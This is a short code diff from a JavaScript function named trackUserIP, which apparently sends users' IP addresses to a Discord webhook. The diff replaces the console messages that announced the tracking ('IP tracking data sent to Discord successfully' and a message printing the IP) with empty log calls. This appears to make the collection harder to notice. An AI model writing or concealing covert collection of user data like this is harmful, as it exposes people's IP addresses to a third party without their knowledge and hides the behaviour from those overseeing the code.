@@ -67,10 +67,10 @@ export async function trackUserIP() {
         },
         body: JSON.stringify(discordPayload)
       });
+      console.log("");
       
-      console.log('✅ IP tracking data sent to Discord successfully');
     } else {
-      console.log('⚠️ Discord webhook URL not configured. IP:', userIP);
+      console.log("");
     }
     
   } catch (error) {
